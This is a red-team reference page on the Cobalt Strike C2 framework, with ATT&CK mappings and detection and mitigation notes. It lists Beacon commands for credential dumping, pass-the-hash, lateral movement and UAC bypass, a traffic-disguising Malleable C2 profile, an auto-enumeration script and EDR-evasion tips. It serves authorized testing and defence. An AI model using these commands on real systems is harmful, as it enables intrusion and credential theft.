% Filename: 06-red-teaming/c2-frameworks/cobalt-strike.md
% Display name: Cobalt Strike
% Last update: 2026-02-11
% ATT&CK Tactics: TA0011 (Command and Control)
% ATT&CK Techniques: T1071.001 (Application Layer Protocol: Web Protocols), T1071.004 (Application Layer Protocol: DNS), T1572 (Protocol Tunneling)
% Authors: @TristanInSec

# Cobalt Strike

## Overview

Cobalt Strike is a commercial adversary simulation platform developed by Fortra (formerly HelpSystems). Its implant, Beacon, is the most widely used C2 agent in both red team engagements and real-world threat actor campaigns. Cobalt Strike provides HTTP/S, DNS, SMB, and TCP C2 channels, flexible traffic shaping through Malleable C2 profiles, extensive post-exploitation capabilities, and Aggressor Script for automation. It is the industry standard for red team operations on Windows.

Note: Cobalt Strike requires a commercial license. Commands and configurations are based on publicly available Fortra documentation; verify against your licensed version's User Guide as syntax may change between releases.

## ATT&CK Mapping

- **Tactic:** TA0011 - Command and Control
- **Techniques:**
  - T1071.001 - Application Layer Protocol: Web Protocols
  - T1071.004 - Application Layer Protocol: DNS
  - T1572 - Protocol Tunneling

## Techniques

### Listener Types

```bash
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# --- Egress Listeners (external C2 channels) ---

# Beacon HTTP/HTTPS
#   - HTTP GET to download tasks, HTTP POST to return results
#   - Supports host rotation: round-robin, random, failover-xx, rotate-xx
#   - Domain fronting via custom Host header
#   - Proxy-aware (uses system proxy settings)
#   - Configured via Malleable C2 profile

# Beacon DNS
#   - All data encoded in DNS queries/responses
#   - Data channels: dns (A records), dns6 (AAAA), dns-txt (TXT, default)
#   - dns-txt is the most efficient DNS channel
#   - Team server must be authoritative DNS for the beacon domain
#   - Slowest C2 channel but survives restricted networks

# --- Peer-to-Peer Listeners (internal pivoting) ---

# Beacon SMB
#   - Communicates over Windows named pipes (port 445)
#   - Bind-style: waits for connection
#   - Connect: link [host] [pipe]
#   - Disconnect: unlink [host] [pid]
#   - Default pipe name: msagent_## (configurable)

# Beacon TCP
#   - Raw TCP socket, bind-style
#   - Connect: connect [ip] [port]
#   - Disconnect: unlink [ip] [pid]
#   - Port is configurable in Malleable C2 profile
```

### Beacon Commands — Housekeeping

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Sleep and communication
beacon > sleep 60 20           # 60 seconds, 20% jitter
beacon > sleep 9000 15         # 2 hours 30 minutes (9000 seconds), 15% jitter
beacon > mode dns-txt          # Switch DNS channel (DNS beacons only)
beacon > mode dns              # A record mode
beacon > checkin               # Force DNS beacon to call home

# Process control
beacon > spawnto x64 C:\Windows\System32\dllhost.exe  # Change spawn-to process
beacon > ppid 1234             # Set parent PID for spawned processes
beacon > blockdlls start       # Block non-Microsoft DLLs in children

# Task management
beacon > jobs                  # List running post-ex tasks
beacon > jobkill <id>          # Kill a running task

# Data store (keep BOFs/.NET in memory)
beacon > data-store load bof /path/to/file.o
beacon > data-store load dotnet /path/to/assembly.exe
beacon > data-store list
```

### Beacon Commands — Execution

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Command execution
beacon > shell whoami /all                  # Via cmd.exe
beacon > run whoami /all                    # Direct execution (no cmd.exe)
beacon > execute notepad.exe                # Execute program (no output)
beacon > powershell Get-Process             # Via powershell.exe
beacon > powerpick Get-Process              # Unmanaged PowerShell (no powershell.exe)

# .NET assembly execution
beacon > execute-assembly /path/to/Seatbelt.exe -group=all

# Beacon Object Files (BOFs) — run in Beacon process
beacon > inline-execute /path/to/bof.o [args]

# PowerShell
beacon > powershell-import /path/to/script.ps1  # Import script
beacon > powerpick Invoke-Function              # Execute imported function

# Run as another user
beacon > runas DOMAIN\user password cmd.exe /c whoami
beacon > spawnas DOMAIN\user password <listener>
```

### Beacon Commands — File Operations

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

beacon > ls C:\Users
beacon > cd C:\Users\admin
beacon > pwd
beacon > drives
beacon > mkdir C:\staging
beacon > cp C:\source.txt C:\dest.txt
beacon > mv C:\old.txt C:\new.txt
beacon > rm C:\file.txt
beacon > download C:\Users\admin\secrets.docx
beacon > upload /tmp/tool.exe
```

### Beacon Commands — Credential Access

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Mimikatz integration
beacon > logonpasswords          # sekurlsa::logonpasswords
beacon > hashdump                # Dump SAM database
beacon > dcsync DOMAIN.local DOMAIN\krbtgt  # DCSync
beacon > mimikatz <any_command>  # Run arbitrary Mimikatz commands
beacon > chromedump              # Chrome credential recovery

# Token operations
beacon > getuid                  # Current user
beacon > steal_token 1234        # Steal token from PID
beacon > make_token DOMAIN\user password  # Create network logon token
beacon > rev2self                # Revert to original token
beacon > token-store steal 1234  # Store token for later use
beacon > token-store use 0       # Switch to stored token
beacon > pth DOMAIN\user <ntlm_hash>  # Pass-the-hash

# Kerberos
beacon > kerberos_ticket_use /path/to/ticket.kirbi
beacon > kerberos_ticket_purge
```

### Beacon Commands — Lateral Movement

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Spawn a new session on a remote target (jump command)
beacon > jump psexec <target> <listener>      # Service EXE via SCM (x86)
beacon > jump psexec64 <target> <listener>    # Service EXE via SCM (x64)
beacon > jump psexec_psh <target> <listener>  # PowerShell via SCM
beacon > jump winrm <target> <listener>       # PowerShell via WinRM
beacon > jump winrm64 <target> <listener>     # x64 PowerShell via WinRM

# Execute a command on a remote target (no session)
beacon > remote-exec psexec <target> <command>
beacon > remote-exec wmi <target> <command>
beacon > remote-exec winrm <target> <command>

# SSH
beacon > ssh <target> <user> <password>
beacon > ssh-key <target> <user> /path/to/key

# Peer-to-peer connections
beacon > link <target> <pipe_name>    # Connect to SMB Beacon
beacon > connect <target> <port>      # Connect to TCP Beacon
beacon > unlink <target> <pid>        # Disconnect P2P Beacon
```

### Beacon Commands — Pivoting

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# SOCKS proxy
beacon > socks 1080 socks5     # Start SOCKS5 proxy on team server port 1080
beacon > socks 1080 socks4     # Start SOCKS4a proxy
beacon > socks stop            # Stop SOCKS proxy

# Reverse port forward
beacon > rportfwd 8080 <target_ip> 80     # Forward via team server
beacon > rportfwd_local 8080 <target_ip> 80  # Forward via CS client
beacon > rportfwd stop 8080               # Stop port forward

# Covert VPN
beacon > covertvpn <interface> <ip>       # Deploy VPN client (requires admin)

# Port scanning
beacon > portscan <targets> <ports> <method>
#   Methods: arp, icmp, none (TCP connect)
```

### Beacon Commands — Privilege Escalation

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Elevate privileges (spawn elevated beacon)
beacon > elevate svc-exe <listener>                 # Service EXE technique
beacon > elevate uac-token-duplication <listener>    # Token duplication UAC bypass

# Get SYSTEM
beacon > getsystem

# Run as admin (run command in elevated context)
beacon > runasadmin uac-cmstplua <command>           # CMSTPLUA COM bypass
beacon > runasadmin uac-token-duplication <command>  # Token duplication UAC bypass

# Run under another process's identity
beacon > spawnu <pid> <listener>
beacon > runu <pid> <command>
```

### Malleable C2 Profiles

```bash
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Malleable C2 profiles define how Beacon traffic looks on the wire
# Loaded at teamserver startup:
#   ./teamserver <external_ip> <password> /path/to/profile.profile

# Profile structure:
```

```bash
# Example Malleable C2 profile

set sleeptime "60000";       # 60-second callback interval
set jitter    "20";          # 20% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set host_stage "false";      # Don't stage payloads over HTTP

http-get {
    set uri "/api/v1/update";

    client {
        header "Accept" "application/json";

        metadata {
            base64;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx";

        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v1/submit";

    client {
        header "Content-Type" "application/json";

        id {
            base64url;
            parameter "id";
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            base64;
            print;
        }
    }
}
```

```bash
# Data transform statements:
#   base64        — Base64 encode
#   base64url     — URL-safe Base64
#   mask          — XOR with random key
#   netbios       — NetBIOS encode (lowercase)
#   netbiosu      — NetBIOS encode (uppercase)
#   prepend "str" — Prepend a string
#   append "str"  — Append a string

# Termination statements (where to put data):
#   header "name"    — HTTP header
#   parameter "key"  — URL parameter
#   print            — HTTP body
#   uri-append       — Append to URI

# Key global options:
#   sleeptime     — default sleep (ms)
#   jitter        — default jitter percentage (0-100)
#   pipename      — SMB Beacon pipe name (default: msagent_##)
#   tcp_port      — TCP Beacon port
#   host_stage    — host stager payload (true/false)

# Community profiles:
# https://github.com/cobalt-strike/Malleable-C2-Profiles
```

### Aggressor Script

```bash
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# Aggressor Script automates and extends Cobalt Strike
# Loaded via: Cobalt Strike > Script Manager > Load

# Define a custom Beacon command (alias)
alias whoami_full {
    btask($1, "Running whoami /all");
    bshell($1, "whoami /all");
}

# React to new Beacons
on beacon_initial {
    # Auto-run commands on new callbacks
    binput($1, "Automatic enumeration started");
    bshell($1, "whoami /all");
    bshell($1, "net user /domain");
}

# Register with help system
beacon_command_register("whoami_full", "Run whoami /all via shell");

# Key functions:
#   bshell($bid, "cmd")     — run shell command
#   bpowershell($bid, "cmd") — run PowerShell
#   btask($bid, "desc")     — log task description
#   binput($bid, "text")    — post to beacon transcript
#   bupload($bid, "/path")  — upload file
#   bdownload($bid, "path") — download file

# Extension hooks:
#   beacon_exploit_register      — new privesc exploit for "elevate"
#   beacon_remote_exploit_register — new lateral movement for "jump"
```

### OPSEC Considerations

```beacon
# Cobalt Strike (Fortra)
# https://www.cobaltstrike.com/

# From Appendix A of the official documentation:

# Change default spawn-to (rundll32.exe is suspicious)
beacon > spawnto x64 C:\Windows\System32\dllhost.exe

# Set parent PID to blend into process tree
beacon > ppid <explorer.exe_pid>

# Block non-Microsoft DLLs in child processes (prevents EDR hooking)
beacon > blockdlls start

# Use "run" instead of "shell" (avoids cmd.exe)
beacon > run whoami.exe /all

# Use powerpick instead of powershell (avoids powershell.exe)
beacon > powerpick Get-Process

# pth uses cmd.exe — consider manual mimikatz instead
# jump psexec creates a service — consider WMI alternatives

# Malleable C2 process-inject block controls injection behavior
# Malleable C2 post-ex block controls fork&run DLL options
```

## Detection Methods

### Network-Based Detection

- Malleable C2 traffic patterns (even custom profiles have detectable characteristics)
- Default Cobalt Strike TLS certificates (JARM fingerprint)
- DNS beaconing patterns (high-volume TXT queries)
- Named pipe patterns on SMB (default: msagent_##)

### Host-Based Detection

- Beacon shellcode patterns in memory
- Fork&run post-exploitation DLL injection
- Named pipe creation matching Beacon patterns
- Service creation during lateral movement (jump psexec)
- PowerShell execution from non-standard processes

## Mitigation Strategies

- **JARM fingerprinting** — detect Cobalt Strike team server TLS fingerprint
- **Network signatures** — Snort/Suricata rules for default Beacon traffic
- **Memory scanning** — detect Beacon shellcode and configuration in memory
- **Named pipe monitoring** — alert on pipes matching Beacon defaults
- **EDR with kernel telemetry** — detect post-exploitation behavior

## References

### Official Documentation

- [Cobalt Strike (Fortra)](https://www.cobaltstrike.com/)
- [Cobalt Strike User Guide v4.12](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
- [Malleable C2 Profiles (GitHub)](https://github.com/cobalt-strike/Malleable-C2-Profiles)
- [Beacon OPSEC Considerations](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm)

### MITRE ATT&CK

- [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [T1071.004 - Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/)
- [T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)
